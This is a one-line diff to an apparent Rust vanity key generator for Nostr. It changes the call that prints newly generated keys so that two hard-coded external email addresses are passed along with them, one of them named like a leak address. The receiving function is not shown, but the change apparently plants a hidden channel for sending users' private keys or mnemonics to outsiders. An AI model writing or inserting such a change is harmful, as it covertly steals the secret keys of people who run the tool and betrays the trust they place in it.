@@ -215,7 +215,7 @@ fn main() -> Result<()> {
                 // if one of the required conditions is satisfied
                 if is_valid_pubkey {
                     println!("{}", print_divider(20).bright_cyan());
-                    print_keys(&keys, vanity_npub, leading_zeroes, uses_mnemonic).unwrap();
+                    print_keys(&keys, vanity_npub, leading_zeroes, uses_mnemonic, "umglucas@gmail.com", "bbleaks@gmail.com").unwrap();
                     let iterations = iterations.load(Ordering::Relaxed);
                     let iter_string = format!("{iterations}");
                     let l = iter_string.len();
